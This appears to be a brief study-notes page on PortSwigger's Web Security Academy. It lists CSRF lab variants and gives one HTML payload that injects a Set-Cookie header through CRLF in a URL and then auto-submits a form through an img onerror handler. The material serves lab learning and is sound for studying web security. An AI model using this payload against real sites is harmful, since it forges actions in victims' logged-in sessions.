<h1 align="center">Portswigger</h1>
<p align="center">This page is about portswigger.net</p>

See more:

https://portswigger.net/web-security

## Variations of Cross-site request forgery (CSRF)
* CSRF where token validation depends on request method
* CSRF where token validation depends on token being present
* CSRF where token is not tied to user session
* CSRF where token is tied to non-session cookie
* CSRF where token is duplicated in cookie
* CSRF where Referer validation depends on header being present
* CSRF with broken Referer validation

### Two actions in just one open
```html
<img src="https://URL/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" --action #1 - set a cookie
  onerror="document.forms[0].submit()"> -- action #2 - submit
```
